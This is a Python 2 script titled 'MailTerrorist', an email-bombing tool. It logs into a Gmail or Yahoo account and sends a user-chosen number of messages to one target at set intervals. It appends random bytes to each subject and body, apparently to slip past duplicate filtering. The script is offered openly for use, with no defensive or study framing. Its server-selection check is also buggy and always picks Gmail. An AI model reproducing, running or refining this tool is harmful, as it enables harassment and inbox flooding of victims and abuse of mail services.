#!/usr/bin/python

# MailTerrorist

import os
import smtplib
import getpass
import sys
import time

print """
   *
 (  `     (         (   *   )                                     )
 )\))(    )\    (   )\` )  /(   (   (    (         (   (       ( /(
((_)()\((((_)(  )\ ((_)( )(_)) ))\  )(   )(    (   )(  )\  (   )\())
(_()((_))\ _ )\((_) _ (_(_()) /((_)(()\ (()\   )\ (()\((_) )\ (_))/
|  \/  |(_)_\(_)(_)| ||_   _|(_))   ((_) ((_) ((_) ((_)(_)((_)| |_
| |\/| | / _ \  | || |  | |  / -_) | '_|| '_|/ _ \| '_|| |(_-<|  _|
|_|  |_|/_/ \_\ |_||_|  |_|  \___| |_|  |_|  \___/|_|  |_|/__/ \__|


[?] Script by: Peroh

"""

def isEmpty(string):
    if not string:
        print("\nInvalid input: string is empty\n")
        return True
    else:
        return False

def getInput(msg):
    while True:
        inp = raw_input(msg)
        if isEmpty(inp): continue
        else: break
    return inp

server = getInput('Mail server:\n 1 - Gmail\n 2 - Yahoo\n\n> ')
user = getInput('\nEmail: ')
passwd = getpass.getpass('Password: ')


to = getInput('\nTo: ')
subject = getInput('Subject: ')
body = getInput('Message: ')
emails = getInput('Number of emails to send: ')
interval = getInput('Interval between messages: ')
random = getInput('Number of random characters: ')

if server == 'gmail' or '1' or 'Gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo' or '2' or 'Yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
else:
    sys.exit()

try:
    server = smtplib.SMTP(smtp_server,port)
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, int(emails)+1):
        subject = subject + ' ' + os.urandom(int(random))
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n\n' + body + ' ' + os.urandom(int(random)/2) + '\n' + os.urandom(int(random)/2) 
        server.sendmail(user,to,msg)
        time.sleep(int(interval))
        print "[+] E-mails sent: %i" % i
    server.quit()
    print '\n[=] Done'
    sys.exit()
except KeyboardInterrupt:
    print '[-] Canceled (KeyboardInterrupt)'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[-] Could not authenticate account (Authentication error)'
    print '[!] Your username or password could have a typo, please try again'
    print '[!] Allow access to less secure apps on your gmail account. https://www.google.com/settings/security/lesssecureapps'
    sys.exit()
